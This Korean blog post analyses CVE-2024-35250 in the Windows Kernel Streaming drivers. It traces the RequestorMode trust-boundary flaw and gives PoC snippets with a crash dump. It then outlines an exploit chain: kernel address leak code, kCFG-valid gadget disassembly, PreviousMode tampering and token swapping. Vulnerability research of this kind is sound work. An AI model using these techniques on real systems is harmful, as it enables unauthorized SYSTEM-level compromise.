---
layout: post
title: Windows Kernel Streaming Driver LPE Analysis (CVE-2024-35250)
description: Windows Kernel Streaming 드라이버의 CVE-2024-35250 로컬 권한 상승 취약점을 Root Cause, PoC, Exploit 흐름으로 분석합니다.
summary: ks.sys의 RequestorMode 신뢰 경계 위반을 추적하고, PoC와 kCFG 우회 기반 LPE exploit 구현 과정을 정리합니다.
comments: true
tags: [Windows, CVE Analysis]
---

## 개요

CVE-2024-35250은 Windows 커널 스트리밍 드라이버에서 발견된 로컬 권한 상승 취약점이다. 이 취약점은 Windows 10/11 및 Server 2008~2022 전반에 영향을 미치며, CVSS 기준 7.8점으로 높은 심각도를 가진다.

이 글은 화이트햇스쿨 3기에서 진행했던 Windows Kernel 1-day 분석 프로젝트를 정리한 글이다. 프로젝트에서는 CVE-2024-35250의 Root Cause 분석부터 PoC 작성, Exploit 흐름 정리까지 진행했으며, 나는 그중에서도 취약점이 발생하는 원인을 추적하는 Root Cause 분석을 주로 담당했다.

취약점의 핵심은 **신뢰되지 않은 포인터 역참조(Untrusted Pointer Dereference)**이다. 커널 스트리밍 드라이버(`ks.sys`)가 사용자 입력 버퍼를 처리하는 과정에서 `RequestorMode` 기반 신뢰 경계를 잘못 다루면서, 사용자 모드에서 전달된 데이터가 커널 모드 요청처럼 처리되는 문제가 발생한다. 이를 통해 공격자는 특정 조건에서 검증을 우회하고, 최종적으로 SYSTEM 권한 상승으로 이어지는 primitive를 구성할 수 있다.

본 글에서는 이 취약점의 Root Cause를 중심으로 분석 과정을 정리하고, 프로젝트에서 작성한 PoC와 Exploit 흐름이 Root Cause와 어떻게 연결되는지 함께 살펴본다. 특히 `ks.sys`와 `ksthunk.sys` 사이에서 IOCTL이 재호출되는 과정, 그리고 그 과정에서 `RequestorMode`가 어떻게 잘못 전파되는지를 중점적으로 다룬다.

---

## 1. 배경 지식

Root Cause를 따라가기 전에, 이 취약점에서 직접 사용되는 Windows I/O 처리 흐름을 먼저 정리한다. 특히 사용자 요청이 IOCTL을 통해 IRP로 변환되는 과정, IRP의 `RequestorMode`가 검증 로직에 미치는 영향, 그리고 Kernel Streaming에서 `IOCTL_KS_PROPERTY`가 처리되는 경로를 중심으로 본다.

### 1.1 IOCTL (Input Output Control)

IOCTL은 사용자 모드(User Mode)와 커널 모드(Kernel Mode)를 연결하는 인터페이스이다.

일반적으로 사용자 애플리케이션은 커널이나 하드웨어에 직접 접근할 수 없다. 운영체제는 보안과 안정성을 위해 사용자 영역과 커널 영역을 엄격히 분리하기 때문이다. 그렇다면 사용자 프로그램이 하드웨어를 제어하거나 커널 기능을 사용하려면 어떻게 해야 할까?

이때 사용하는 것이 IOCTL이다. 사용자 애플리케이션은 `DeviceIoControl` API를 호출하여 특정 제어 코드와 함께 데이터를 커널 드라이버에 전달할 수 있다. 드라이버는 이 요청을 받아 해당 작업을 수행하고 결과를 반환한다.
![IRP와 IO StackLocation 구조](/assets/images/writings/IRP.png){:width="100%" height="auto"}

![IOCTL 통신 구조](/assets/images/writings/01-ioctl-communication.svg){:width="100%" height="auto"}

IOCTL 요청이 발생하면, Windows의 I/O Manager는 이 요청을 IRP(I/O Request Packet)라는 구조체로 변환하여 드라이버에 전달한다.

### 1.2 IRP (I/O Request Packet)

IRP는 커널 모드 내에서 드라이버 간, 또는 I/O Manager와 드라이버 간의 통신을 위해 사용되는 핵심 데이터 구조체이다. 쉽게 말해 "작업 요청서"와 같다.

사용자 애플리케이션이 파일 읽기, 쓰기, 또는 장치 제어 같은 I/O 작업을 요청하면 다음과 같은 처리 과정을 거친다.

1. I/O Manager가 IRP를 생성한다
2. 생성된 IRP를 해당 장치의 드라이버 스택(Driver Stack) 최상위 드라이버로 전달한다
3. 드라이버는 요청을 직접 처리하거나, 필요시 하위 드라이버로 IRP를 전달한다
4. 요청이 완료되면 결과가 다시 스택을 거슬러 올라가 요청자에게 반환된다

![IRP 흐름과 드라이버 스택](/assets/images/writings/02-irp-flow.svg){:width="100%" height="auto"}

IRP 구조체에는 여러 중요한 필드가 있는데, 이 중 취약점과 밀접한 관련이 있는 것이 RequestorMode 필드이다.

#### RequestorMode 필드

`RequestorMode`는 IRP를 생성한 주체가 어느 모드에서 실행 중이었는지를 나타낸다.

| 값 | 의미 | 일반적인 처리 |
|---|---|---|
| 0 | KernelMode | 커널 모드에서 생성된 요청으로 간주되어, 드라이버가 별도 검증을 생략하는 경우가 많음 |
| 1 | UserMode | 사용자 모드 요청으로 간주되어, 버퍼 접근 전 검증이 필요함 |

드라이버는 이 값을 확인하여 보안 검사를 수행할지 여부를 결정한다. `UserMode`에서 온 요청이라면 드라이버는 `ProbeForRead`, `ProbeForWrite` 같은 함수로 버퍼의 유효성과 접근 권한을 검증해야 한다. 반면 `KernelMode`로 표시된 요청은 커널 구성 요소가 만든 요청으로 간주되기 때문에, 일부 드라이버는 버퍼 검증을 생략한다.

문제는 `RequestorMode` 값이 항상 버퍼 내용의 실제 신뢰도를 보장하지는 않는다는 점이다. 이 차이가 CVE-2024-35250에서 신뢰 경계가 깨지는 지점과 직접 연결된다.

### 1.3 커널 스트리밍 (Kernel Streaming)

Windows는 실시간 멀티미디어 데이터(오디오, 비디오 등)의 효율적인 처리를 위해 커널 스트리밍(Kernel Streaming, KS) 프레임워크를 제공한다. 이 프레임워크는 커널 모드에서 직접 데이터를 처리하여 지연 시간을 최소화하고, 모듈식 설계로 다양한 하드웨어에 대한 확장성을 제공한다.

커널 스트리밍 아키텍처의 주요 구성 요소는 다음과 같다:

#### ksthunk.sys

`ksthunk.sys`는 Kernel Streaming 요청 중 32비트 애플리케이션과 64비트 커널 사이의 구조체 변환을 담당하는 thunk 드라이버이다. 이 글에서 중요한 부분은 `ksthunk.sys`가 특정 KS Property 요청을 처리하면서 `RequestorMode`를 기준으로 사용자 버퍼 검증 여부를 결정한다는 점이다.

#### ks.sys

`ks.sys`는 Kernel Streaming의 공통 처리 로직을 담당하는 시스템 드라이버이다. `IOCTL_KS_PROPERTY`, `IOCTL_KS_METHOD`와 같은 표준 요청을 받아 Property Set과 플래그를 해석하고, 필요하면 내부적으로 다시 IOCTL을 구성해 하위 경로로 전달한다. CVE-2024-35250에서는 이 재구성 과정이 핵심 분석 대상이 된다.

![커널 스트리밍 아키텍처](/assets/images/writings/02-ks-architecture.svg){:width="100%" height="auto"}

### 1.4 KS Property (커널 스트리밍 속성)

Windows 장치 드라이버는 사용자 모드에서 `DeviceIoControl` API를 통해 장치의 속성(Property)을 조회하거나 변경할 수 있다. 커널 스트리밍 드라이버에서 사용하는 이러한 속성을 KS Property라고 하며, `IOCTL_KS_PROPERTY` 제어 코드를 통해 설정한다.

KS Property 요청은 보통 `KSPROPERTY` 구조체를 통해 전달되며, `Set`, `Id`, `Flags` 값에 따라 어떤 Property Set의 어떤 동작을 수행할지가 결정된다. 이후 Root Cause 분석에서 다룰 `KSPROPERTY_TYPE_UNSERIALIZESET`도 이 `Flags`에 설정되는 값이다.

#### IOCTL_KS_PROPERTY

`IOCTL_KS_PROPERTY`는 커널 스트리밍 환경에서 속성 값을 얻거나 설정할 때 사용되는 입출력 제어 코드이다. 사용자 애플리케이션이 `DeviceIoControl`을 호출하면 이 제어 코드가 드라이버에 전달된다.

이 요청을 처리하는 주요 함수가 `KsPropertyHandler`이며, 내부적으로 `KspPropertyHandler`를 호출한다:

```c
NTSTATUS __stdcall KsPropertyHandler(
    PIRP Irp, 
    ULONG PropertySetsCount, 
    const KSPROPERTY_SET *PropertySet)
{
    return KspPropertyHandler(Irp, 0, 0LL, 0);
}
```

---

## 2. Root Cause 분석

이제 배경 지식을 바탕으로 CVE-2024-35250의 근본 원인을 분석한다. 취약점은 커널 스트리밍의 속성 역직렬화(Unserialization) 과정에서 발생한다.

### 2.1 속성 스트림 직렬화와 역직렬화

Kernel Streaming에서는 여러 속성을 한 번에 처리하기 위해 serialize/unserialize 관련 플래그를 사용한다.

| 플래그 | 역할 |
|---|---|
| `KSPROPERTY_TYPE_SERIALIZESET` | 여러 속성을 직렬화하여 하나의 버퍼로 반환 |
| `KSPROPERTY_TYPE_UNSERIALIZESET` | 직렬화된 버퍼를 역직렬화하여 각 속성에 설정 |

Root Cause 분석에서 먼저 확인해야 할 분기점은 `KSPROPERTY_TYPE_UNSERIALIZESET`이다. 이 플래그가 설정되면 `KspPropertyHandler`는 `UnserializePropertySet`으로 진입하고, 이후 내부에서 각 property를 다시 IOCTL 형태로 처리한다.

```c
NTSTATUS __fastcall KspPropertyHandler(PIRP Irp, ...)
{
    ...
    if ( v24 == 4096 )  // KSPROPERTY_TYPE_UNSERIALIZESET
        return UnserializePropertySet(Irp, v22, v7);
    ...
}
```

### 2.2 RequestorMode 기반 검증

사용자 애플리케이션이 `DeviceIoControl`을 통해 IOCTL 요청을 보내면, I/O Manager는 IRP를 생성하면서 `RequestorMode`를 UserMode(1)로 설정한다. 이후 KS 드라이버(ksthunk.sys, ks.sys)는 이 값을 확인하여 검증 여부를 결정한다.

```c
if ( Irp->RequestorMode )  // UserMode인 경우
{
    ProbeForRead(CurrentStackLocation->Parameters.CreatePipe.Parameters, 
                 Options, 1u);  // 버퍼 유효성 검증
    ...
}
```

- `RequestorMode = 1` (UserMode): 신뢰하지 않는 버퍼로 판단, 검증 수행
- `RequestorMode = 0` (KernelMode): 커널에서 온 요청으로 간주되어, 일부 검증 경로가 생략될 수 있음

첫 번째 IOCTL 요청은 사용자 모드에서 이루어지므로, I/O Manager는 IRP의 `RequestorMode`를 1로 설정하고, `KspPropertyHandler` 내부의 검증은 정상적으로 수행된다.

즉, 최초 요청 자체는 사용자 모드 요청으로 정상 처리된다. 문제는 이 요청이 `UnserializePropertySet` 내부에서 다시 IOCTL로 구성될 때 발생한다.

![RequestorMode 정상 검증 흐름](/assets/images/writings/03-requestor-mode-flow.svg){:width="100%" height="auto"}

### 2.3 취약점의 핵심: IOCTL 재호출

문제는 `UnserializePropertySet` 함수 내부에서 발생한다. 이 함수는 직렬화된 속성들을 하나씩 역직렬화하면서 각 속성에 대해 IOCTL을 재호출한다. 이때 `KsSynchronousIoControlDevice` 함수를 사용한다.

```c
v16 = KsSynchronousIoControlDevice(
    *(PFILE_OBJECT *)(v6 + 48),  // FileObject
    0,                           // RequestorMode ← 주목!
    *(_DWORD *)(v6 + 24),        // IoControl
    PoolWithTag,                 // InBuffer (사용자 데이터 복사본)
    InSize,
    OutBuffer,
    OutSize,
    &BytesReturned);
```

위 함수의 파라미터를 보면 두 번째 인자가 0으로 하드코딩되어 있다. 이 값은 새로 생성되는 IRP의 `RequestorMode`를 설정하는 데 사용된다.

| 인자 값 | 의미 |
|---|---|
| 0 | KernelMode |
| 1 | UserMode |

즉, `UnserializePropertySet`이 내부적으로 IOCTL을 재호출할 때, 새로운 IRP의 RequestorMode가 KernelMode(0)로 설정된다.

### 2.4 신뢰 경계 위반

`KsSynchronousIoControlDevice` 함수의 내부를 살펴보자.

```c
NTSTATUS __stdcall KsSynchronousIoControlDevice(...)
{
    ...
    // 새로운 IRP 생성
    NewIrp = IoBuildDeviceIoControlRequest(
        IoControl,
        RelatedDeviceObject,
        InBuffer,           // 사용자 데이터가 복사된 버퍼
        InSize,
        OutBuffer,
        OutSize,
        0,                  // InternalDeviceIoControl
        &Event,
        &IoStatusBlock);
    
    // RequestorMode를 전달받은 값(0 = KernelMode)으로 설정
    NewIrp->RequestorMode = RequestorMode;
    
    ...
    
    // 드라이버로 IRP 전달
    Status = IofCallDriver(RelatedDeviceObject, NewIrp);
}
```

`IoBuildDeviceIoControlRequest` 함수로 새 IRP를 생성한 후, `RequestorMode`를 전달받은 값으로 설정한다. `UnserializePropertySet`이 0을 전달했으므로, 새 IRP는 KernelMode에서 생성된 것으로 표시된다.

Microsoft 공식 문서에서도 이 동작을 확인할 수 있다:

> "In the IRP that IoBuildDeviceIoControlRequest returns, the RequestorMode field is always set to KernelMode. This value indicates that the request, and any information contained in the request, is from a trusted, kernel-mode component."

**문제는 새 IRP에 포함된 데이터 버퍼가 신뢰할 수 없는 사용자 모드에서 온 데이터를 그대로 담고 있다는 점이다.**

![취약점 발생 흐름](/assets/images/writings/03-vulnerability-flow.svg){:width="100%" height="auto"}

### 2.5 검증 우회와 임의 함수 호출

새로 생성된 IRP는 IOCTL 재요청을 통해 `ksthunk.sys`로 전달된다. `CKSThunkDevice::CheckIrpForStackAdjustmentNative` 함수는 `RequestorMode`만으로 IRP 검증 여부를 판별한다:

```c
__int64 __fastcall CKSThunkDevice::CheckIrpForStackAdjustmentNative(
    __int64 a1, struct _IRP *irp, __int64 a3, int *a4)
{
    ...
    // DrmAudioStream 속성 집합을 처리하는 경우
    if ( *(_OWORD *)&Type3InputBuffer->Set == *(_OWORD *)&KSPROPSETID_DrmAudioStream
         && !type3inputbuf.Id
         && (type3inputbuf.Flags & 2) != 0 )
    {
        ...
        if ( a2->RequestorMode )  // UserMode면 에러 반환
        {
            v14 = -1073741808;  // STATUS_INVALID_PARAMETER
        }
        else  // KernelMode면 검증 없이 진행
        {
            UserBuffer = (unsigned int *)a2->UserBuffer;
            ...
            // 사용자 버퍼에서 함수 포인터를 가져와 호출!
            v14 = ((__int64 (__fastcall *)(_QWORD, _QWORD, _QWORD *))
                   Type3InputBuffer[7])(*UserBuffer, 0, v20);
        }
    }
    ...
}
```

`RequestorMode`가 KernelMode(0)로 설정되어 있으므로 아래의 문제가 발생한다.
1. 주소 유효성 및 접근 권한 검증(ProbeForRead/Write)이 생략된다
2. DrmAudioStream 속성 집합 처리 시, 사용자 입력 버퍼에서 함수 포인터를 가져와 호출한다
3. 이때 사용자 버퍼의 값이 함수 호출의 첫 번째 인자(rcx)로 직접 사용된다

이를 통해 공격자는 제한적인 형태의 커널 함수 호출 primitive를 얻는다. 호출 대상은 이후 kCFG 검사를 통과할 수 있는 커널 함수로 제한되며, 인자 역시 이 경로에서 전달되는 값의 형태에 영향을 받는다.

### 2.6 Microsoft 가이드라인 위반

Microsoft는 IoBuildDeviceIoControlRequest 관련 문서에서 다음과 같이 명시하고 있다.

> "If the caller cannot validate parameter values that it copies from a user-mode buffer to the input buffer, or if these values must not be interpreted as coming from a kernel-mode component, the caller should set the RequestorMode field in the IRP to UserMode. This setting informs the driver that handles the I/O control request that the buffer contains untrusted, user-mode data."

번역: 호출자가 사용자 모드 버퍼에서 복사한 매개변수 값을 검증할 수 없거나, 해당 값이 커널 모드 구성 요소에서 온 것으로 해석되어서는 안 되는 경우, 호출자는 IRP의 RequestorMode 필드를 UserMode로 설정해야 한다.

그러나 `UnserializePropertySet`은 사용자 데이터를 포함한 IRP를 생성하면서 `RequestorMode`를 KernelMode로 설정했다. 이는 Microsoft의 핵심 보안 가이드라인을 정면으로 위반하는 것이다.

### 2.7 Root Cause 요약

CVE-2024-35250의 근본 원인은 다음 세 가지 조건의 결합이다.

| 조건 | 설명 |
|---|---|
| 1. KsSynchronousIoControlDevice 활용 | IOCTL 재호출 시 새 IRP 생성 |
| 2. 제어 가능한 입출력 버퍼 | 공격자가 입력/출력 버퍼 내용을 제어 가능 |
| 3. RequestorMode 기반 보안 검사 | 새 IRP의 RequestorMode가 KernelMode로 설정되어 검증 우회 |

취약점이 발생하는 흐름을 사용자 입력의 관점에서 보면 다음과 같다.

1. 공격자는 unserialize 요청 안에 재호출될 property 데이터와 제어 가능한 버퍼 값을 넣어 보낸다.
2. `UnserializePropertySet`은 이 데이터를 커널 버퍼로 복사한 뒤, 각 property를 처리하기 위해 내부 IOCTL을 다시 만든다.
3. 이 과정에서 새 IRP의 `RequestorMode`가 `KernelMode`로 설정된다.
4. 하지만 새 IRP 안의 데이터는 여전히 공격자가 만든 값에서 유래한다.
5. 이후 `ksthunk.sys`는 해당 요청을 커널 요청으로 보고 사용자 버퍼 검증을 생략한다.
6. 결국 공격자가 넣은 함수 포인터와 인자가 커널 코드 경로에서 사용되면서 취약점이 트리거된다.

핵심은 데이터가 커널 버퍼에 복사되었다는 사실이 아니라, 사용자 입력에서 유래한 데이터가 `KernelMode` 요청의 데이터처럼 재해석되었다는 점이다.

따라서 Root Cause는 단일 함수의 포인터 검증 누락이라기보다, IOCTL 재호출 과정에서 사용자 데이터의 신뢰 수준이 잘못 승격되는 **access mode mismatch**로 볼 수 있다.

---

## 3. PoC (Proof of Concept)

PoC는 취약점의 존재와 취약 조건을 입증하기 위한 코드이다. Root Cause 분석에서 확인한 내용을 바탕으로, IRP의 검증이 생략될 때 잘못된 주소를 넣어도 검증하지 않는다는 점을 이용하여 임의 주소 호출을 트리거하는 PoC를 작성한다.

### 3.1 DRM 장치 핸들 획득

취약한 커널 스트리밍 디바이스에 접근하기 위해 DRM 장치 핸들을 연다. DRM 장치를 선정한 이유는 `DrmAudioStream` 속성 집합을 통해 취약한 코드 경로에 도달할 수 있기 때문이다.

```c
HANDLE GetKsDevice(const GUID categories) {
    HANDLE hDevice = 0;
    HRESULT hr = KsOpenDefaultDevice(&categories, 
                                     GENERIC_READ | GENERIC_WRITE, 
                                     &hDevice);
    if (hr != NOERROR) return NULL;
    return hDevice;
}
```

획득한 DRM 장치 핸들은 이후 `DeviceIoControl` 함수를 통해 취약한 IOCTL 명령을 전송하는 데 사용된다.

### 3.2 입출력 버퍼 구성

PoC에서 버퍼는 두 가지 역할을 한다. 입력 버퍼에는 `UnserializePropertySet`이 다시 처리할 property 정보와 호출 대상으로 사용될 값을 배치한다. 출력 버퍼에는 재호출 과정에서 참조될 구조체와, 이후 호출 인자로 전달될 값을 배치한다.

![PoC 입출력 버퍼 구성](/assets/images/writings/04-poc-buffer-layout.svg){:width="100%" height="auto"}

여기서 함수 포인터 자리에는 정상 함수 주소 대신 `0x4242424242424242`를 넣고, 첫 번째 인자로 전달될 위치에는 `0xDEADBEEF` 계열 값을 넣는다. 이후 크래시 덤프에서 `rax`와 `rcx`를 확인하면, 두 값이 실제 indirect call 경로까지 도달했는지 확인할 수 있다.

### 3.3 콜스택 흐름

IOCTL 요청이 커널에 전달된 뒤, PoC는 다음 흐름으로 크래시 지점에 도달한다.

![PoC 콜스택 흐름](/assets/images/writings/04-poc-callstack.svg?v=20260621-ksflow){:width="100%" height="auto"}

1. UserMode에서 `DeviceIoControl()`로 `IOCTL_KS_PROPERTY` 요청을 보낸다.
2. `ks!KspPropertyHandler`가 property flags를 확인하고 `KSPROPERTY_TYPE_UNSERIALIZESET` 경로로 분기한다.
3. `ks!UnserializePropertySet`이 직렬화된 property 데이터를 풀어 각 property를 다시 처리한다.
4. `ks!KsSynchronousIoControlDevice`가 내부 IOCTL 요청을 만들고, 새 IRP의 `RequestorMode`를 `KernelMode`로 설정한다.
5. 재호출된 요청이 `ksthunk!CKSThunkDevice::CheckIrpForStackAdjustmentNative`에 도달한다.
6. 검증이 우회된 뒤 사용자 입력에서 유래한 함수 포인터가 `guard_dispatch_icall_nop`을 통해 호출되며 크래시가 발생한다.

### 3.4 크래시 결과 분석

PoC 실행 결과, 다음과 같은 BSOD가 발생한다.

```
BUGCHECK_CODE:  3b
BUGCHECK_P1:    c0000005
BUGCHECK_P2:    fffff80170b13380
BUGCHECK_P3:    fffff986af506100
BUGCHECK_P4:    0

CONTEXT:  fffff986af506100
rax=4242424242424242 rbx=ffff9a07d9e709a0 rcx=00000000deadbeef
...
ksthunk!guard_dispatch_icall_nop:
fffff801`70b13380 ffe0    jmp    rax {42424242`42424242}
```

BugCheck 파라미터 분석:

| 파라미터 | 값 | 의미 |
|---|---|---|
| 오류코드 | 3b (SYSTEM_SERVICE_EXCEPTION) | 커널 모드에서 시스템 서비스 처리 중 예외 발생 |
| P1 | 0xC0000005 | Access Violation (잘못된 메모리 참조) |
| P2 | 0xFFFFF80170B13380 | 오류가 발생한 명령어 주소 (RIP) |
| P3 | 0xFFFFF986AF506100 | 오류 발생 시점의 스택/문맥 주소 |

크래시는 사용자 모드에서 전달된 비정상 함수 포인터가 `rax` 레지스터에 로드된 후, `jmp rax` 명령을 통해 공격자가 지정한 주소(0x4242424242424242)로 제어 흐름이 변경되면서 발생했다. 이 주소는 커널에서 유효하지 않은 주소이므로 Access Violation이 발생하여 BSOD로 이어졌다.

이로써 공격자가 제어한 함수 포인터와 인자가 검증을 우회해 커널의 indirect call 지점까지 도달함을 확인했다. 이 PoC는 권한 상승 자체가 아니라, 이후 exploit에서 사용할 제한적인 함수 호출 primitive가 성립함을 입증한다.

---

## 4. Exploit

PoC에서는 공격자가 제어한 함수 포인터와 인자가 커널의 indirect call 지점까지 도달함을 확인했다. 이제 이 제한적인 함수 호출 primitive를 이용해 `PreviousMode`를 변조하고, 최종적으로 SYSTEM 권한 상승으로 이어지는 흐름을 정리한다.

### 4.1 Exploit으로의 확장

PoC를 통해 다음 두 가지 조건을 확인했다.

1. 제한적인 함수 호출 primitive: 사용자 입력에서 유래한 함수 포인터가 커널의 indirect call 경로까지 전달된다.
2. 첫 번째 인자 제어: 호출 시 `rcx`에 공격자가 준비한 값이 전달된다. 다만 이 값은 경로 특성상 완전한 64비트 임의 값이라기보다 제약이 있는 형태로 다뤄야 한다.

이 primitive만으로 바로 사용자 영역 쉘코드를 실행할 수는 없다. SMEP와 kCFG 때문에 호출 대상은 커널 코드 안의 유효한 함수여야 하고, 인자 제어도 제한적이다. 따라서 exploit은 코드 실행보다 커널 데이터 조작 방향으로 구성했다.

### 4.2 우회해야 할 보호 기법

| 보호 기법 | 설명 | 우회 전략 |
|---|---|---|
| kASLR (Kernel Address Space Layout Randomization) | 커널 모듈 주소 무작위화 | NtQuerySystemInformation으로 런타임에 모듈 주소 동적 획득 |
| SMEP (Supervisor Mode Execution Prevention) | 커널 모드에서 사용자 영역 코드 실행 방지 | 쉘코드 대신 커널 가젯 활용 |
| kCFG (Kernel Control Flow Guard) | 간접 호출 시 유효한 함수 주소인지 비트맵 검사 | kCFG 비트맵에 등록된 함수만 호출 대상으로 사용 |

SMEP와 kCFG로 인해 사용자 모드에 위치한 쉘코드나 임의의 ROP 가젯을 직접 실행하는 방식은 사용할 수 없다. 특히 이 취약점의 호출 경로는 kCFG 검사를 거치므로, 단순히 사용자 영역 쉘코드 주소나 임의 ROP 가젯으로 점프하는 방식은 안정적으로 사용할 수 없다.

따라서 이 exploit은 kCFG 검사를 통과할 수 있는 커널 함수를 호출 대상으로 선택하고, 그 함수의 부수 효과를 이용해 커널 구조체 값을 조작하는 방식으로 구성했다.

### 4.3 Exploit 전략

LPE를 달성하기 위한 전체 전략은 다음과 같다.

1. `NtQuerySystemInformation`으로 필요한 커널 객체와 모듈 베이스 주소를 구한다.
2. 현재 스레드의 `KTHREAD` 주소를 기준으로 `PreviousMode` 위치를 계산한다.
3. kCFG를 통과할 수 있는 커널 함수를 호출 대상으로 선택한다.
4. 해당 함수의 동작을 이용해 `PreviousMode`를 `KernelMode` 값으로 바꾼다.
5. `NtWriteVirtualMemory`를 이용해 현재 프로세스의 Token을 SYSTEM Token으로 교체한 뒤, `PreviousMode`를 복구한다.

![익스플로잇 흐름](/assets/images/writings/05-exploit-strategy.svg){:width="100%" height="auto"}

### 4.4 주요 개념 설명

#### PreviousMode

`PreviousMode`는 `KTHREAD` 구조체의 필드로, 현재 스레드가 어떤 모드에서 호출되었는지를 나타낸다.

| 값 | 의미 |
|---|---|
| 0 | KernelMode |
| 1 | UserMode |

이 값은 `NtWriteVirtualMemory`, `NtReadVirtualMemory` 같은 시스템 콜에서 커널 주소에 대한 접근을 허용할지 결정하는 데 사용된다. 정상적으로는 UserMode 프로세스가 호출하면 `PreviousMode = 1`이므로 커널 메모리에 직접 접근할 수 없다.

하지만 현재 스레드의 `PreviousMode`를 0으로 바꾸면, 일부 시스템 콜은 호출자가 커널 모드라고 판단하여 사용자 버퍼 검증과 커널 주소 접근 제한을 다르게 처리한다. 이 특성을 이용하면 `NtReadVirtualMemory`, `NtWriteVirtualMemory`를 커널 메모리 read/write primitive처럼 사용할 수 있다.

#### Token Swapping

Windows에서 각 프로세스는 `EPROCESS` 구조체를 가지며, 이 구조체의 `Token` 필드에는 해당 프로세스의 권한 정보가 저장된다. Token Swapping은 현재 프로세스의 Token을 SYSTEM 프로세스(PID 4)의 Token으로 덮어써 SYSTEM 권한을 획득하는 기법이다.

실제 구현에서는 `EPROCESS->Token`이 `_EX_FAST_REF` 형태라는 점도 고려해야 한다. 단순히 포인터 전체를 복사하기보다, 필요한 경우 하위 reference count 비트를 보존하거나 마스킹해야 한다.

### 4.5 Exploit 구현

#### 4.5.1 kASLR 우회 - 커널 주소 유출

`NtQuerySystemInformation` API를 사용하여 필요한 커널 주소들을 런타임에 동적으로 추출한다. 다만 이 방식은 Windows 빌드와 보안 설정에 따라 제한될 수 있다. 여기서는 프로젝트 재현 환경에서 `SystemHandleInformation`과 `SystemModuleInformation`을 통해 필요한 주소를 얻을 수 있다는 전제에서 진행했다.

커널 객체 주소 획득:

아래 코드는 핵심 흐름만 정리한 형태이다.

```c
int32_t GetObjPtr(_Out_ PULONG64 ppObjAddr, _In_ ULONG ulPid, _In_ HANDLE handle)
{
    PSYSTEM_HANDLE_INFORMATION pHandleInfo = NULL;
    ULONG ulBytes = 0;
    NTSTATUS Status = STATUS_SUCCESS;

    // 시스템의 모든 핸들 정보를 가져올 때까지 버퍼 크기 조정
    while ((Status = NtQuerySystemInformation(
                (SYSTEM_INFORMATION_CLASS)SystemHandleInformation, 
                pHandleInfo, ulBytes, &ulBytes)) == 0xC0000004L)
    {
        // 버퍼 재할당
    }

    // 지정된 PID와 핸들 값에 일치하는 객체 검색
    for (ULONG i = 0; i < pHandleInfo->NumberOfHandles; i++)
    {
        if (pHandleInfo->Handles[i].UniqueProcessId == ulPid &&
            pHandleInfo->Handles[i].HandleValue == (USHORT)(ULONG_PTR)handle)
        {
            *ppObjAddr = (ULONG64)(ULONG_PTR)pHandleInfo->Handles[i].Object;
            return 0;
        }
    }
    return -1;
}
```

이 함수로 다음 커널 객체들의 주소를 획득한다.

| 객체 | 용도 |
|---|---|
| 현재 스레드 (KTHREAD) | PreviousMode 필드 주소 계산 |
| 현재 프로세스 (EPROCESS) | Token 필드 덮어쓰기 대상 |
| SYSTEM 프로세스 (EPROCESS, PID 4) | Token 값 복사 원본 |

커널 모듈 주소 획득:

아래 코드 역시 핵심 흐름만 정리한 형태이다.

```c
UINT_PTR GetKernelModuleAddress(const char* TargetModule)
{
    NTSTATUS status;
    ULONG ulBytes = 0;
    PSYSTEM_MODULE_INFORMATION handleTableInfo = NULL;

    while ((status = NtQuerySystemInformation(
                (SYSTEM_INFORMATION_CLASS)SystemModuleInformation, 
                handleTableInfo, ulBytes, &ulBytes)) == STATUS_INFO_LENGTH_MISMATCH)
    {
        // 버퍼 재할당
    }

    for (ULONG i = 0; i < handleTableInfo->ModulesCount; i++)
    {
        char* moduleName = strstr(handleTableInfo->Modules[i].Name, TargetModule);
        if (moduleName != NULL)
        {
            return (UINT_PTR)handleTableInfo->Modules[i].ImageBaseAddress;
        }
    }
    return 0;
}
```

`ntoskrnl.exe`의 베이스 주소를 획득하여 이후 kCFG 우회 가젯의 실제 주소를 계산하는 데 사용한다.

#### 4.5.2 kCFG 우회 가젯 선정

kCFG를 우회하면서 `PreviousMode`를 0으로 변조하기 위해 다음 조건을 만족하는 커널 함수를 찾아야 한다.

1. 단일 인자(rcx)만 사용하거나, 단일 인자만으로 원하는 주소에 값을 쓸 수 있어야 함
2. 내부에서 `[[rcx]] = value` 또는 `*(*rcx + offset) = value` 형태의 메모리 쓰기 동작 수행
3. 쓰기 대상 주소가 rcx 또는 rcx로부터 유도 가능해야 함 (UserMode에서 제어 가능)
4. kCFG 비트맵(GuardCFFunctionTable)에 등록되어 있어야 함

분석을 통해 두 가지 유효한 가젯을 발견했다.

가젯 1: DbgkpTriageDumpRestoreState

IDA로 분석한 결과, 이 함수는 rcx 레지스터 하나만 참조하며 다음 연산을 수행한다.

```
[[rcx] + 0x2078] = [rcx + 0x10]
[[rcx] + 0x207C] = [rcx + 0x14]
```

```
PAGE:00000001407F26F0  mov     eax, [rcx+0Ch]
PAGE:00000001407F26F3  mov     rdx, [rcx]
PAGE:00000001407F26F6  mov     [rcx+18h], eax
PAGE:00000001407F26F9  mov     eax, [rcx+10h]
PAGE:00000001407F26FC  mov     [rdx+2078h], eax    ; [[rcx] + 0x2078] = [rcx + 0x10]
PAGE:0000000140702702  mov     rdx, [rcx]
PAGE:0000000140702705  mov     eax, [rcx+14h]
PAGE:0000000140702708  mov     [rdx+207Ch], eax    ; [[rcx] + 0x207C] = [rcx + 0x14]
PAGE:000000014070270E  retn
```

즉, rcx가 가리키는 구조체를 통해 임의의 커널 주소에 원하는 8바이트 값을 쓸 수 있다.

PE-Bear로 `ntoskrnl.exe`의 GuardCFFunctionTable을 확인한 결과, 이 함수가 kCFG 비트맵에 등록되어 있음을 확인했다.

가젯 2: ExpProfileDelete

이 함수는 내부적으로 `ObfDereferenceObjectWithTag`를 호출하여 객체의 레퍼런스 카운트를 감소시킨다.

```c
void __fastcall ExpProfileDelete(__int64 a1)
{
    ...
    if ( *(_QWORD *)a1 )
        ObfDereferenceObjectWithTag(*(PVOID *)a1, 0x66507845u);
}
```

레퍼런스 카운트는 객체 주소에서 -0x30 위치(`_OBJECT_HEADER`의 `PointerCount` 필드)에 있으므로, 원하는 주소 + 0x30을 인자로 전달하면 해당 주소의 값을 1 감소시킬 수 있다.

`PreviousMode`가 1에서 0으로 변경되어야 하므로, 이 가젯을 사용하여 1바이트를 감소시키면 된다.

#### 4.5.3 PreviousMode 변조 구성

아래 오프셋들은 프로젝트 재현 환경에서 확인한 값이다. Windows 빌드가 달라지면 `KTHREAD`, `EPROCESS`, 커널 함수 오프셋이 달라질 수 있으므로, 실제 재현 시에는 WinDbg 심볼이나 디스어셈블리 결과를 기준으로 다시 확인해야 한다.

